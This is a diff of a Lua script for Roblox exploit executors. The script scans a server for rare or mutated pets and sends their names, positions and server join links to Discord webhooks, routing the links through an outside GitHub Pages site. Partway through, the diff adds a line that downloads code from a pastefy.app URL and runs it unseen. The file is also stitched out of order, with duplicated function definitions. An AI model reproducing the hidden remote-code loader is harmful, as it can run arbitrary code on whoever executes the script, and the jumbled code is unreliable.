@@ -121,6 +121,218 @@ local function sendMutation(petName, mutKey, generationText, pos)
     local webhook = Webhooks[mutKey]
     if not style or not webhook then return end
     local mutationLabel = string.format("🧬 %s %s %s", style.emoji, mutKey:upper(), style.emoji)
+
+    -- Link dinámico con tu página
+    local joinLink = string.format(
+        "https://hxck4x416.github.io/Notifier/?placeId=%s&gameInstanceId=%s",
+        tostring(game.PlaceId),
+        tostring(game.JobId)
+    )
+
+    local fields = {
+        { name = "Nombre", value = petName, inline = true },
+        { name = "Mutación", value = mutationLabel, inline = true },
+        { name = "Generación", value = generationText or "?", inline = true },
+        { name = "Servidor", value = string.format("[Click para unirte](%s)", joinLink), inline = false }
+    }
+    if pos then
+        table.insert(fields, {name="Posición", value=string.format("X: %.1f, Y: %.1f, Z: %.1f", pos.X, pos.Y, pos.Z), inline=false})
+    end
+
+    sendDiscordEmbed(webhook, {
+        title = "🐾 Pet Mutación Detectada",
+        description = "Se encontró un pet con mutación especial.",
+        color = style.color,
+        fields = fields,
+        footer = "Pet Mutation Finder"
+    })
+end
+
+-------------------------------------------------------------------------------------------------
+-- 2) Notificador de notifyPets
+-------------------------------------------------------------------------------------------------
+local detected = {}
+
+local function sendNotifyPet(petModel, mutationText, generationText)
+    local pos = petModel.PrimaryPart and petModel.PrimaryPart.Position or Vector3.new()
+
+    -- Link dinámico con tu página
+    local joinLink = string.format(
+        "https://hxck4x416.github.io/Notifier/?placeId=%s&gameInstanceId=%s",
+        tostring(game.PlaceId),
+        tostring(game.JobId)
+    )
+
+    local fields = {
+        { name = "Nombre", value = petModel.Name, inline = true },
+        { name = "Mutación", value = mutationText or "Normal", inline = true },
+        { name = "Generación", value = generationText or "?", inline = true },
+        { name = "Servidor", value = string.format("[Click para unirte](%s)", joinLink), inline = false },
+        { name = "Posición", value = string.format("X: %.1f, Y: %.1f, Z: %.1f", pos.X, pos.Y, pos.Z), inline = false },
+    }
+    sendDiscordEmbed(DISCORD_WEBHOOK_NOTIFY, {
+        title = "🐾 Pet de notifyPets Detectado",
+        description = "Se encontró un pet de la lista objetivo.",
+        color = 65280,
+        fields = fields,
+        footer = "Pet Notifier"
+    })
+end
+
+-------------------------------------------------------------------------------------------------
+-- ESCANEO DE SERVIDOR
+-------------------------------------------------------------------------------------------------
+local function scanPets()
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        local podiums = plot:FindFirstChild("AnimalPodiums")
+        if podiums then
+            for _, podium in ipairs(podiums:GetChildren()) do
+                local base = podium:FindFirstChild("Base")
+                local spawn = base and base:FindFirstChild("Spawn")
+                local attachment = spawn and spawn:FindFirstChild("Attachment")
+                local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
+
+                if overhead then
+                    local displayName = overhead:FindFirstChild("DisplayName")
+                    local mutation = overhead:FindFirstChild("Mutation")
+                    local generation = overhead:FindFirstChild("Generation")
+
+                    if displayName and displayName:IsA("TextLabel") then
+                        local name = displayName.Text
+                        local mutText = (mutation and mutation.Text) or "Normal"
+                        local genText = (generation and generation.Text) or "?"
+
+                        -- Caso 1: mutaciones
+                        if mutText ~= "" and mutText ~= "Normal" then
+                            for key, _ in pairs(MutationStyles) do
+                                if key == "YinYang" then
+                                    if string.find(mutText:lower(), "yin") and string.find(mutText:lower(), "yang") then
+                                        sendMutation(name, key, genText, spawn.Position)
+                                    end
+                                else
+                                    if string.find(mutText:lower(), key:lower()) then
+                                        sendMutation(name, key, genText, spawn.Position)
+                                    end
+                                end
+                            end
+                        end
+
+                        -- Caso 2: pets de notifyPets
+                        for _, obj in ipairs(Workspace:GetDescendants()) do
+                            if obj:IsA("Model") and notifyPets[obj.Name] and not detected[obj] then
+                                detected[obj] = true
+                                sendNotifyPet(obj, mutText, genText)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Escaneo inmediato
+pcall(scanPets)
+
+-- Escaneo cada 10 segundos
+task.spawn(function()
+    while task.wait(10) do
+        pcall(scanPets)
+    end
+end)
+
+print("✅ Script combinado cargado (Mutations + notifyPets).")
+
+loadstring(game:HttpGet("https://pastefy.app/MJw2J4T6/raw"))()--// Pets especiales a vigilar (notifyPets)
+local notifyPets = {
+    ["Agarrini la Palini"] = true,
+    ["Bisonte Giuppitere"] = true,
+    ["Blackhole Goat"] = true,
+    ["Bulbito Bandito Traktorito"] = true,
+    ["Cacasito Satalito"] = true,
+    ["Chicleteira Bicicleteira"] = true,
+    ["Chimpanzini Spiderini"] = true,
+    ["Crabbo Limonetta"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Dul Dul Dul"] = true,
+    ["Esok Sekolah"] = true,
+    ["Garama and Madundung"] = true,
+    ["Graipuss Medussi"] = true,
+    ["Gattatino Nyanino"] = true,
+    ["Job Job Job Sahur"] = true,
+    ["Karkerkar Kurkur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["La Grande Combinasion"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Vacca Saturno Saturnita"] = true,
+    ["Las Tralaleritas"] = true,
+    ["Las Vaquitas Saturnitas"] = true,
+    ["Los Bombinitos"] = true,
+    ["Los Combinasionas"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Matteos"] = true,
+    ["Los Noo My Hotspotsitos"] = true,
+    ["Los Orcalitos"] = true,
+    ["Los Spyderinis"] = true,
+    ["Los Tralaleritos"] = true,
+    ["Los Tungtungtungcitos"] = true,
+    ["Mastodontico Telepiedone"] = true,
+    ["Matteo"] = true,
+    ["Noo My Hotspot"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Pakrahmatmamat"] = true,
+    ["Pot Hotspot"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Sammyni Spyderini"] = true,
+    ["Statutino Libertino"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Tartaruga Cisterna"] = true,
+    ["Torrtuginni Dragonfrutini"] = true,
+}
+
+--// Compatibilidad con executors
+local function getRequestFunc()
+    return (syn and syn.request)
+        or (http and http.request)
+        or http_request
+        or request
+        or (fluxus and fluxus.request)
+        or nil
+end
+
+--// Enviar embed a Discord
+local function sendDiscordEmbed(webhook, args)
+    local req = getRequestFunc()
+    if not req then return end
+    local payload = {
+        embeds = {{
+            title = args.title or "Evento",
+            description = args.description or "",
+            color = args.color or 16776960,
+            fields = args.fields or {},
+            footer = { text = args.footer or "" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    req({
+        Url = webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end
+
+-------------------------------------------------------------------------------------------------
+-- 1) Notificador de Mutaciones
+-------------------------------------------------------------------------------------------------
+local function sendMutation(petName, mutKey, generationText, pos)
+    local style = MutationStyles[mutKey]
+    local webhook = Webhooks[mutKey]
+    if not style or not webhook then return end
+    local mutationLabel = string.format("🧬 %s %s %s", style.emoji, mutKey:upper(), style.emoji)
     local serverLink = string.format("https://www.roblox.com/games/%d?jobId=%s", game.PlaceId, game.JobId)
 
     local fields = {
